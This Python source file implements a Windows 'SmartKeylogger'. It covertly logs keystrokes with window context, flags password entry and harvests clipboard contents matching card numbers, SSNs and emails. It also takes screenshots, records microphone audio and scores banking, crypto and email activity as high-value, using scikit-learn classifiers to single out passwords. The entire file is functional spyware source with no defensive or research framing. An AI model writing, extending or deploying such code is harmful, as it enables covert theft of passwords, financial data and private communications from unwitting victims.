import os
import time
import json
import re
import threading
import win32clipboard
import win32gui
import win32process
import win32api
import win32con
import pyautogui
import pyperclip
import sounddevice as sd
import wave
import numpy as np
from typing import Dict, List, Set, Optional, Any
from datetime import datetime
from pynput import keyboard, mouse
from dataclasses import dataclass, field
from pathlib import Path

# AI imports for intelligent keylogging analysis
from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.cluster import KMeans
import joblib

@dataclass
class KeyStroke:
    """Thông tin về một keystroke"""
    key: str
    timestamp: float
    window_title: str
    process_name: str
    is_password: bool = False
    context: str = ''

@dataclass 
class FormInput:
    """Thông tin về form input được phát hiện"""
    field_type: str  # password, text, email, etc
    field_name: str
    value: str
    url: str
    timestamp: float

class SmartKeylogger:
    """Keylogger với các tính năng nâng cao"""

    def __init__(self, log_dir: str = "logs"):
        # Initialize logging
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True)
        
        # Keystroke logging
        self.keystrokes: List[KeyStroke] = []
        self.form_inputs: List[FormInput] = []
        self.clipboard_data: List[Dict] = []
        
        # AI Components for intelligent analysis
        self.ai_password_detector = None
        self.ai_sensitive_classifier = None
        self.ai_pattern_analyzer = None
        self.text_vectorizer = TfidfVectorizer(max_features=1000)
        self.pattern_history = []
        self.classification_history = []
        
        # Initialize AI models
        self._init_ai_models()
        
        # Patterns for detection
        self.password_patterns: Set[str] = {
            'password', 'pass', 'pwd', 'secret', 'login', 'auth'
        }
        self.sensitive_patterns: Set[str] = {
            r'\b\d{16}\b',  # Credit card
            r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Email
            r'\b\d{3}-\d{2}-\d{4}\b',  # SSN
        }
        
        # Runtime state
        self.running = False
        self.last_window = ''
        self.current_context = ''
        
        # Pattern analysis
        self.pattern_buffer: List[KeyStroke] = []
        self.pattern_interval = 0.5
        
        # Audio recording
        self.audio_chunk = 1024
        self.audio_format = np.int16
        self.channels = 1
        self.rate = 44100
        self.audio_buffer = []
        
        # Screenshots
        self.screenshot_interval = 60  # seconds
        self.screenshot_events = {
            'mouse_click': True,
            'key_combo': True,
            'window_change': True
        }
        
        # Threads
        self.threads = []

    def start(self) -> bool:
        """Start monitoring"""
        if not self.running:
            try:
                self.running = True
                
                # Keyboard monitoring
                keyboard_thread = threading.Thread(target=self._monitor_keyboard)
                keyboard_thread.daemon = True
                keyboard_thread.start()
                self.threads.append(keyboard_thread)
                
                # Mouse monitoring 
                mouse_thread = threading.Thread(target=self._monitor_mouse)
                mouse_thread.daemon = True
                mouse_thread.start()
                self.threads.append(mouse_thread)
                
                # Clipboard monitoring
                clipboard_thread = threading.Thread(target=self._monitor_clipboard)
                clipboard_thread.daemon = True 
                clipboard_thread.start()
                self.threads.append(clipboard_thread)
                
                # Screenshot monitoring
                screenshot_thread = threading.Thread(target=self._screenshot_loop)
                screenshot_thread.daemon = True
                screenshot_thread.start()
                self.threads.append(screenshot_thread)
                
                # Audio monitoring
                audio_thread = threading.Thread(target=self._audio_loop)
                audio_thread.daemon = True
                audio_thread.start()
                self.threads.append(audio_thread)
                
                return True
                
            except Exception as e:
                print(f"Error starting monitor: {str(e)}")
                self.running = False
                return False
                
        return False

    def stop(self) -> bool:
        """Stop monitoring"""
        if self.running:
            try:
                self.running = False
                for thread in self.threads:
                    thread.join()
                self.threads.clear()
                return True
            except Exception as e:
                print(f"Error stopping monitor: {str(e)}")
                return False
        return False

    def _get_window_info(self) -> tuple:
        """Get thông tin về window hiện tại"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION | 
                                        win32con.PROCESS_VM_READ, False, pid)
            process_name = win32process.GetModuleFileNameEx(process, 0)
            window_title = win32gui.GetWindowText(hwnd)
            process.close()
            return process_name, window_title
        except Exception:
            return "Unknown", "Unknown"

    def _is_password_field(self, context: str) -> bool:
        """Check if current context là password field"""
        return any(p.lower() in context.lower() for p in self.password_patterns)

    def _monitor_keyboard(self):
        """Monitor keyboard events"""
        def on_press(key):
            if not self.running:
                return False
                
            try:
                process_name, window_title = self._get_window_info()
                
                # Update context nếu window thay đổi
                if window_title != self.last_window:
                    self.current_context = window_title
                    self.last_window = window_title
                    
                    if self.screenshot_events['window_change']:
                        self._take_screenshot('window_change')
                
                # Create keystroke
                k = KeyStroke(
                    key=str(key),
                    timestamp=time.time(),
                    window_title=window_title,
                    process_name=process_name,
                    is_password=self._is_password_field(self.current_context),
                    context=self.current_context
                )
                
                self.keystrokes.append(k)
                self.pattern_buffer.append(k)
                
                # Check for interesting key combinations
                if self._check_interesting_combo(key):
                    self._take_screenshot('key_combo')
                
                # Analyze pattern buffer
                self._analyze_patterns()
                
            except Exception:
                pass
                
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    def _monitor_mouse(self):
        """Monitor mouse events để detect form inputs"""
        def on_click(x, y, button, pressed):
            if not self.running:
                return False
                
            try:
                if pressed:
                    process_name, window_title = self._get_window_info()
                    
                    # Check if clicked element là form input
                    element_info = self._get_element_info(x, y)
                    if element_info and element_info.get('tag') == 'input':
                        input_type = element_info.get('type', 'text')
                        name = element_info.get('name', '')
                        url = self._get_url_from_title(window_title)
                        
                        # Monitor value changes
                        if input_type == 'password':
                            self.current_context = f'password_{name}'
                        else:
                            self.current_context = f'{input_type}_{name}'
                            
                        self.form_inputs.append(FormInput(
                            field_type=input_type,
                            field_name=name,
                            value='',
                            url=url,
                            timestamp=time.time()
                        ))
                        
                    if self.screenshot_events['mouse_click']:
                        self._take_screenshot('mouse_click')
                        
            except Exception:
                pass
                
        with mouse.Listener(on_click=on_click) as listener:
            listener.join()

    def _monitor_clipboard(self):
        """Monitor clipboard changes"""
        last_content = ''
        
        while self.running:
            try:
                current = pyperclip.paste()
                if current != last_content and current:
                    # Check for sensitive data
                    is_sensitive = False
                    matched_pattern = None
                    
                    for pattern in self.sensitive_patterns:
                        if re.search(pattern, current, re.IGNORECASE):
                            is_sensitive = True
                            matched_pattern = pattern
                            break
                            
                    self.clipboard_data.append({
                        'content': current,
                        'timestamp': time.time(),
                        'is_sensitive': is_sensitive,
                        'pattern': matched_pattern,
                        'window': self._get_window_info()[1]
                    })
                    
                    last_content = current
                    
            except Exception:
                pass
                
            time.sleep(0.1)

    def _screenshot_loop(self) -> None:
        """Periodic screenshot capture"""
        while self.running:
            try:
                self._take_screenshot('interval')
                time.sleep(self.screenshot_interval)
            except:
                time.sleep(self.screenshot_interval)

    def _take_screenshot(self, trigger: str) -> None:
        """Capture and save screenshot"""
        try:
            timestamp = datetime.now()
            filename = self.log_dir / f"screenshot_{timestamp:%Y%m%d_%H%M%S}_{trigger}.png"
            
            # Capture screen
            screenshot = pyautogui.screenshot()
            screenshot.save(filename)
            
        except Exception as e:
            print(f"Error capturing screenshot: {str(e)}")

    def _audio_loop(self) -> None:
        """Record audio when significant sound is detected"""
        try:
            def audio_callback(indata, frames, time, status):
                if status:
                    return
                volume_norm = np.linalg.norm(indata) * 10
                if volume_norm > 0.5:  # Adjust threshold
                    self.audio_buffer.extend(indata)
                    
            with sd.InputStream(callback=audio_callback,
                            channels=self.channels,
                            samplerate=self.rate):
                while self.running:
                    time.sleep(0.1)
                    if len(self.audio_buffer) > self.rate * 5:  # 5 seconds
                        self._save_audio()
                        
        except Exception as e:
            print(f"Error in audio recording: {str(e)}")

    def _save_audio(self) -> None:
        """Save recorded audio buffer"""
        if not self.audio_buffer:
            return
            
        try:
            timestamp = datetime.now()
            filename = self.log_dir / f"audio_{timestamp:%Y%m%d_%H%M%S}.wav"
            
            with wave.open(str(filename), 'wb') as wf:
                wf.setnchannels(self.channels)
                wf.setsampwidth(2)  # 16-bit
                wf.setframerate(self.rate)
                wf.writeframes(np.array(self.audio_buffer).tobytes())
                
            self.audio_buffer.clear()
            
        except Exception as e:
            print(f"Error saving audio: {str(e)}")

    def _analyze_patterns(self):
        """Analyze keystroke patterns"""
        if not self.pattern_buffer:
            return
            
        # Check time window
        now = time.time()
        while self.pattern_buffer and \
              now - self.pattern_buffer[0].timestamp > self.pattern_interval:
            self.pattern_buffer.pop(0)
            
        if len(self.pattern_buffer) < 2:
            return
            
        # Calculate timing patterns
        intervals = []
        for i in range(1, len(self.pattern_buffer)):
            interval = self.pattern_buffer[i].timestamp - \
                      self.pattern_buffer[i-1].timestamp
            intervals.append(interval)
            
        # Detect patterns
        repeated = self._detect_repeated_keys()
        consistent_timing = self._check_timing_consistency(intervals)
        
        if repeated or consistent_timing:
            pattern = {
                'timestamp': time.time(),
                'window': self.last_window,
                'repeated_keys': repeated,
                'consistent_timing': consistent_timing,
                'avg_interval': sum(intervals) / len(intervals)
            }

    def _detect_repeated_keys(self) -> Optional[Dict]:
        """Detect repeated key patterns"""
        if len(self.pattern_buffer) < 3:
            return None
            
        # Convert to key sequence
        keys = [k.key for k in self.pattern_buffer]
        
        # Check for repeating subsequences
        for length in range(2, len(keys)//2 + 1):
            for i in range(len(keys) - 2*length + 1):
                if keys[i:i+length] == keys[i+length:i+2*length]:
                    return {
                        'sequence': keys[i:i+length],
                        'position': i,
                        'length': length
                    }
                    
        return None

    def _check_timing_consistency(self, intervals: List[float]) -> bool:
        """Check for consistent typing patterns"""
        if len(intervals) < 3:
            return False
            
        # Calculate standard deviation
        mean = sum(intervals) / len(intervals)
        variance = sum((x - mean) ** 2 for x in intervals) / len(intervals)
        std_dev = variance ** 0.5
        
        # Check if timing is consistent (low standard deviation)
        return std_dev < 0.1 * mean

    def _check_interesting_combo(self, key: keyboard.Key | keyboard.KeyCode) -> bool:
        """Check for interesting key combinations"""
        key_str = str(key)
        interesting_combos = {
            ('Key.ctrl_l', 'c'),  # Copy
            ('Key.ctrl_l', 'v'),  # Paste
            ('Key.alt_l', 'Key.tab'),  # Window switch
            ('Key.ctrl_l', 'Key.alt_l', 'Key.delete')  # System
        }
        
        # Check last 3 keystrokes
        recent_keys = [k.key for k in self.pattern_buffer[-3:]]
        return any(all(k in recent_keys for k in combo) for combo in interesting_combos)

    def _get_element_info(self, x: int, y: int) -> Optional[Dict]:
        """Get thông tin về element tại vị trí x,y"""
        # TODO: Implement using UI Automation
        return None

    def _get_url_from_title(self, title: str) -> str:
        """Extract URL từ window title"""
        # Common browser title patterns
        patterns = [
            r'https?://[^\s]+',
            r'(?:[\w-]+\.)+[\w-]+(?:/[^\s]*)?'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, title)
            if match:
                return match.group(0)
                
        return ''

    def get_collected_data(self) -> Dict:
        """Return collected data"""
        return {
            'keystrokes': [vars(k) for k in self.keystrokes],
            'form_inputs': [vars(f) for f in self.form_inputs], 
            'clipboard': self.clipboard_data
        }

    def save_data(self, output_file: str):
        """Save collected data to file"""
        data = self.get_collected_data()
        try:
            with open(output_file, 'w') as f:
                json.dump(data, f, indent=2, default=str)
        except Exception:
            pass
    
    def _init_ai_models(self):
        """Initialize AI models for intelligent keylogging"""
        try:
            # Password detection classifier
            self.ai_password_detector = RandomForestClassifier(
                n_estimators=50,
                max_depth=10,
                random_state=42
            )
            
            # Sensitive data classifier
            self.ai_sensitive_classifier = RandomForestClassifier(
                n_estimators=50,
                max_depth=8,
                random_state=42
            )
            
            # Pattern clustering for behavior analysis
            self.ai_pattern_analyzer = KMeans(
                n_clusters=5,
                random_state=42
            )
            
        except Exception as e:
            print(f"Failed to initialize AI models: {e}")
    
    def ai_analyze_keystroke_pattern(self, keystrokes: List[KeyStroke]) -> Dict[str, Any]:
        """Use AI to analyze keystroke patterns for sensitive information"""
        try:
            if not keystrokes:
                return {'type': 'unknown', 'confidence': 0.0, 'sensitive': False}
            
            # Extract text from keystrokes
            text = ''.join([ks.key for ks in keystrokes if len(ks.key) == 1])
            
            # Get context information
            window_title = keystrokes[-1].window_title.lower() if keystrokes else ''
            process_name = keystrokes[-1].process_name.lower() if keystrokes else ''
            
            analysis = {
                'type': 'text',
                'confidence': 0.0,
                'sensitive': False,
                'reasons': [],
                'text_content': text,
                'metadata': {
                    'window_title': window_title,
                    'process_name': process_name,
                    'keystroke_count': len(keystrokes)
                }
            }
            
            # AI-powered password detection
            if self._ai_detect_password_context(text, window_title, process_name):
                analysis['type'] = 'password'
                analysis['sensitive'] = True
                analysis['confidence'] += 0.7
                analysis['reasons'].append('AI password context detected')
            
            # AI-powered sensitive data detection
            sensitive_score = self._ai_detect_sensitive_data(text)
            if sensitive_score > 0.6:
                analysis['sensitive'] = True
                analysis['confidence'] += sensitive_score * 0.8
                analysis['reasons'].append(f'AI sensitive data detection: {sensitive_score:.2f}')
            
            # Pattern-based analysis
            pattern_results = self._analyze_text_patterns(text)
            if pattern_results['sensitive']:
                analysis['sensitive'] = True
                analysis['confidence'] += 0.5
                analysis['reasons'].extend(pattern_results['matches'])
            
            # Context analysis
            context_score = self._analyze_context(window_title, process_name)
            analysis['confidence'] += context_score * 0.3
            
            # Record for learning
            self._record_analysis_result(analysis, keystrokes)
            
            return analysis
            
        except Exception as e:
            print(f"AI keystroke analysis failed: {e}")
            return {'type': 'unknown', 'confidence': 0.0, 'sensitive': False}
    
    def _ai_detect_password_context(self, text: str, window_title: str, process_name: str) -> bool:
        """AI-powered password context detection"""
        try:
            # Extract features for AI analysis
            features = self._extract_password_features(text, window_title, process_name)
            
            # Use AI model if trained
            if hasattr(self.ai_password_detector, 'predict') and len(self.classification_history) > 20:
                try:
                    prediction = self.ai_password_detector.predict([features])[0]
                    return prediction == 1
                except:
                    pass
            
            # Fallback to heuristic analysis
            return self._heuristic_password_detection(text, window_title, process_name)
            
        except Exception as e:
            print(f"Password context detection failed: {e}")
            return False
    
    def _extract_password_features(self, text: str, window_title: str, process_name: str) -> List[float]:
        """Extract features for password detection"""
        try:
            features = []
            
            # Text features
            features.extend([
                len(text),
                len(set(text)) / max(len(text), 1),  # Character diversity
                sum(1 for c in text if c.isupper()) / max(len(text), 1),  # Uppercase ratio
                sum(1 for c in text if c.islower()) / max(len(text), 1),  # Lowercase ratio
                sum(1 for c in text if c.isdigit()) / max(len(text), 1),  # Digit ratio
                sum(1 for c in text if not c.isalnum()) / max(len(text), 1),  # Special char ratio
                int(any(word in text.lower() for word in self.password_patterns))
            ])
            
            # Window context features
            window_indicators = ['login', 'sign', 'auth', 'password', 'security', 'account']
            features.extend([
                int(any(indicator in window_title for indicator in window_indicators)),
                int('browser' in process_name or 'chrome' in process_name or 'firefox' in process_name),
                int('bank' in window_title or 'finance' in window_title),
                int('email' in window_title or 'mail' in window_title)
            ])
            
            return features
            
        except Exception as e:
            print(f"Feature extraction failed: {e}")
            return [0.0] * 11
    
    def _heuristic_password_detection(self, text: str, window_title: str, process_name: str) -> bool:
        """Heuristic password detection as fallback"""
        # Check for password indicators in window title
        if any(pattern in window_title for pattern in self.password_patterns):
            return True
        
        # Check text characteristics
        if len(text) >= 6:  # Minimum password length
            has_variety = (
                any(c.isupper() for c in text) and
                any(c.islower() for c in text) and
                any(c.isdigit() for c in text)
            )
            if has_variety:
                return True
        
        return False
    
    def _ai_detect_sensitive_data(self, text: str) -> float:
        """AI-powered sensitive data detection"""
        try:
            # Pattern matching for known sensitive data
            sensitivity_score = 0.0
            
            # Credit card pattern
            if re.search(r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b', text):
                sensitivity_score += 0.9
            
            # Email pattern
            if re.search(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', text):
                sensitivity_score += 0.6
            
            # Phone number pattern
            if re.search(r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b', text):
                sensitivity_score += 0.5
            
            # Social Security Number
            if re.search(r'\b\d{3}-\d{2}-\d{4}\b', text):
                sensitivity_score += 0.8
            
            # Banking keywords
            banking_keywords = ['account', 'routing', 'swift', 'iban', 'pin']
            for keyword in banking_keywords:
                if keyword in text.lower():
                    sensitivity_score += 0.3
                    break
            
            return min(1.0, sensitivity_score)
            
        except Exception as e:
            print(f"Sensitive data detection failed: {e}")
            return 0.0
    
    def _analyze_text_patterns(self, text: str) -> Dict[str, Any]:
        """Analyze text for sensitive patterns"""
        result = {'sensitive': False, 'matches': []}
        
        for pattern in self.sensitive_patterns:
            if re.search(pattern, text):
                result['sensitive'] = True
                result['matches'].append(f'Pattern match: {pattern}')
        
        return result
    
    def _analyze_context(self, window_title: str, process_name: str) -> float:
        """Analyze context for sensitivity scoring"""
        score = 0.0
        
        # High-value applications
        high_value_apps = ['banking', 'paypal', 'crypto', 'wallet', 'tax', 'finance']
        for app in high_value_apps:
            if app in window_title.lower() or app in process_name.lower():
                score += 0.8
                break
        
        # Browser with secure sites
        if 'browser' in process_name or any(browser in process_name for browser in ['chrome', 'firefox', 'edge']):
            secure_indicators = ['https', 'secure', 'login', 'account']
            if any(indicator in window_title.lower() for indicator in secure_indicators):
                score += 0.6
        
        # Email clients
        email_clients = ['outlook', 'thunderbird', 'mail']
        if any(client in process_name.lower() for client in email_clients):
            score += 0.4
        
        return min(1.0, score)
    
    def _record_analysis_result(self, analysis: Dict, keystrokes: List[KeyStroke]):
        """Record analysis result for AI learning"""
        try:
            record = {
                'timestamp': time.time(),
                'analysis': analysis,
                'keystroke_count': len(keystrokes),
                'text_length': len(analysis.get('text_content', '')),
                'window_title': keystrokes[-1].window_title if keystrokes else '',
                'process_name': keystrokes[-1].process_name if keystrokes else ''
            }
            
            self.classification_history.append(record)
            
            # Keep only recent records
            if len(self.classification_history) > 1000:
                self.classification_history = self.classification_history[-1000:]
                
        except Exception as e:
            print(f"Failed to record analysis result: {e}")
    
    def ai_adaptive_learning(self):
        """Update AI models with collected data"""
        try:
            if len(self.classification_history) < 50:
                return
            
            # Prepare training data
            X = []
            y_password = []
            y_sensitive = []
            
            for record in self.classification_history[-500:]:  # Use last 500 records
                analysis = record['analysis']
                text = analysis.get('text_content', '')
                window_title = record['window_title']
                process_name = record['process_name']
                
                features = self._extract_password_features(text, window_title, process_name)
                X.append(features)
                
                y_password.append(1 if analysis['type'] == 'password' else 0)
                y_sensitive.append(1 if analysis['sensitive'] else 0)
            
            if len(X) >= 20:
                try:
                    # Train password detector
                    self.ai_password_detector.fit(X, y_password)
                    print("Password detector model updated")
                    
                    # Train sensitive data classifier
                    self.ai_sensitive_classifier.fit(X, y_sensitive)
                    print("Sensitive data classifier updated")
                    
                except Exception as e:
                    print(f"Model training failed: {e}")
            
        except Exception as e:
            print(f"Adaptive learning failed: {e}")
    
    def ai_generate_intelligence_report(self) -> Dict[str, Any]:
        """Generate AI-powered intelligence report"""
        try:
            report = {
                'summary': {
                    'total_keystrokes': len(self.keystrokes),
                    'sensitive_inputs': 0,
                    'password_inputs': 0,
                    'applications_monitored': set(),
                    'time_range': None
                },
                'sensitive_data_types': {},
                'application_analysis': {},
                'risk_assessment': 'low',
                'recommendations': []
            }
            
            # Analyze collected data
            sensitive_count = 0
            password_count = 0
            app_data = {}
            
            # Process keystrokes in chunks for analysis
            for i in range(0, len(self.keystrokes), 50):
                chunk = self.keystrokes[i:i+50]
                if chunk:
                    analysis = self.ai_analyze_keystroke_pattern(chunk)
                    
                    app_name = chunk[-1].process_name
                    report['summary']['applications_monitored'].add(app_name)
                    
                    if app_name not in app_data:
                        app_data[app_name] = {'keystrokes': 0, 'sensitive': 0, 'passwords': 0}
                    
                    app_data[app_name]['keystrokes'] += len(chunk)
                    
                    if analysis['sensitive']:
                        sensitive_count += 1
                        app_data[app_name]['sensitive'] += 1
                        
                        data_type = analysis['type']
                        if data_type not in report['sensitive_data_types']:
                            report['sensitive_data_types'][data_type] = 0
                        report['sensitive_data_types'][data_type] += 1
                    
                    if analysis['type'] == 'password':
                        password_count += 1
                        app_data[app_name]['passwords'] += 1
            
            # Update summary
            report['summary']['sensitive_inputs'] = sensitive_count
            report['summary']['password_inputs'] = password_count
            report['summary']['applications_monitored'] = list(report['summary']['applications_monitored'])
            
            if self.keystrokes:
                report['summary']['time_range'] = {
                    'start': self.keystrokes[0].timestamp,
                    'end': self.keystrokes[-1].timestamp
                }
            
            # Application analysis
            report['application_analysis'] = app_data
            
            # Risk assessment
            total_chunks = max(len(self.keystrokes) // 50, 1)
            risk_ratio = sensitive_count / total_chunks
            
            if risk_ratio > 0.3:
                report['risk_assessment'] = 'high'
                report['recommendations'].extend([
                    'High volume of sensitive data detected',
                    'Consider enhanced security monitoring',
                    'Review data handling procedures'
                ])
            elif risk_ratio > 0.1:
                report['risk_assessment'] = 'medium'
                report['recommendations'].extend([
                    'Moderate sensitive data activity',
                    'Monitor for data leakage patterns'
                ])
            else:
                report['risk_assessment'] = 'low'
            
            return report
            
        except Exception as e:
            print(f"Intelligence report generation failed: {e}")
            return {'error': str(e)}